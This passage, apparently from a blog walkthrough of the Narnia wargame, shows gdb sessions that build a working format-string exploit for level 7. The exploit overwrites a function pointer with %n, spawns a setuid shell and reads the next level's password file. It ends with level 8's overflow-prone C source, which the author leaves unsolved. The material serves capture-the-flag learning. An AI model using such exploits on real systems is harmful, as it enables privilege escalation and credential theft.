0xffffd660:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd670:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd680:     0x00000000      0x00000000      0x00000000      0x00000000
</pre>
<p>The value of <em>2f</em> at <code>0xffffd60c</code> shows us that our overwrite was successful
and we wrote the value of <em>47</em>. We need to write <code>0x8048706</code> which is <code>134514438</code> in decimal.
So let's add our <code>%d</code> in and remember to adjust the number of <code>%x</code>s too, so we can see
how much padding we need</p>
<pre class="code console literal-block">
<span class="go">(gdb) r $(python -c &quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%d%n'&quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%d%n'&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:     0xffffd610      0x00000080      0xffffd8a2      0x08048238
0xffffd600:     0xffffd668      0xf7ffda94      0x00000000      0x00000031
0xffffd610:     0x61616161      0xffffd60c      0x38343038      0x66383332
0xffffd620:     0x64666666      0x66383636      0x64666637      0x30343961
0xffffd630:     0x38343038      0x31306536      0x37333336      0x37383137
0xffffd640:     0x00000033      0x00000000      0x00000000      0x00000000
0xffffd650:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd660:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd670:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd680:     0x00000000      0x00000000      0x00000000      0x00000000</span>
</pre>
<p>Ok, so <code>0x8048706 - 0x00000031 = 0x80486d6</code> or <em>134514389</em> in decimal.
Let's see if I'm right</p>
<pre class="code console literal-block">
<span class="go">(gdb) r $(python -c &quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514389d%n'&quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514389d%n'&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:     0xffffd610      0x00000080      0xffffd899      0x08048238
0xffffd600:     0xffffd668      0xf7ffda94      0x00000000      0x080486fc
0xffffd610:     0x61616161      0xffffd60c      0x38343038      0x66383332
0xffffd620:     0x64666666      0x66383636      0x64666637      0x30343961
0xffffd630:     0x38343038      0x20306536      0x20202020      0x20202020
0xffffd640:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd650:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd660:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd670:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd680:     0x20202020      0x20202020      0x20202020      0x00202020</span>
</pre>
<p>Still a little off. Adjusting the value again</p>
<pre class="code console literal-block">
<span class="go">(gdb) r $(python -c &quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514399d%n'&quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514399d%n'&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:     0xffffd610      0x00000080      0xffffd899      0x08048238
0xffffd600:     0xffffd668      0xf7ffda94      0x00000000      0x08048706
0xffffd610:     0x61616161      0xffffd60c      0x38343038      0x66383332
0xffffd620:     0x64666666      0x66383636      0x64666637      0x30343961
0xffffd630:     0x38343038      0x20306536      0x20202020      0x20202020
0xffffd640:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd650:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd660:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd670:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd680:     0x20202020      0x20202020      0x20202020      0x00202020
(gdb) c
Continuing.
Way to go!!!!$</span>
</pre>
<p>And now we need to run it from the commandline to actually get a proper setuid shell</p>
<pre class="code console literal-block">
<span class="o"></span><span class="gp">narnia7&#64;melinda:/narnia$ .//narnia7 $</span><span class="o">(</span>python -c <span class="s2">&quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514399d%n'&quot;</span><span class="o">)</span>
<span class="go">goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
</span><span class="o"></span><span class="gp">narnia7&#64;melinda:/narnia$ .//narnia7 $</span><span class="o">(</span>python -c <span class="s2">&quot;print 'aaaa\x1c\xd6\xff\xff' + '%x'*5 + '%134514399d%n'&quot;</span><span class="o">)</span>
<span class="go">goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whomai
/bin/sh: 1: whomai: not found
</span><span class="gp">$</span> whoami
<span class="go">narnia8
</span><span class="gp">$</span> cat /etc/narnia_pass/narnia8
<span class="go">[password]</span>
</pre>
<p>Notice that the address of <code>ptrf</code> is not the same in the shell :)</p>
</div>
<div class="section" id="level-08">
<h2>Level 08</h2>
<pre class="code c literal-block">
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="c1">// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making &quot;i&quot; global unti i find a fix
// -morla
</span><span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">blah</span><span class="o">=</span><span class="n">b</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">bok</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
    <span class="c1">//int i=0;
</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">bok</span><span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bok</span><span class="p">));</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">bok</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">bok</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">else</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre>
<p>I'm struggling with this, and rather than delay the whole post because of the last
level, I decided to post anyway. I'll update this when I have this figured out.</p>
<p>Sorry.</p>
</div>

		</div> <!--/#entry-content-->
	</div> <!--/#main-->
</div>  <!--/#post-->
	<div id="comments">
		<div id="respond">
			<div id="disqus_thread"></div>
	        <script type="text/javascript">
	            var disqus_shortname = 'unlogic';
	
	            /* * * DON'T EDIT BELOW THIS LINE * * */
	            (function() {
	                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
	                dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
	                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
	            })();
	        </script>
	        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
	        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
		</div><!-- #respond -->					
</div><!-- #comments -->

		</div>
		
		<div id="footer">
			<p><p>Powered by <a href="http://getpelican.com">Pelican</a></p>
<script type="text/javascript">
    var disqus_shortname = 'unlogic';
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = 'http://' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>		</div><!-- /#footer -->
	</div><!-- /#container -->
	<div style="display:none"></div>
</body>
</html>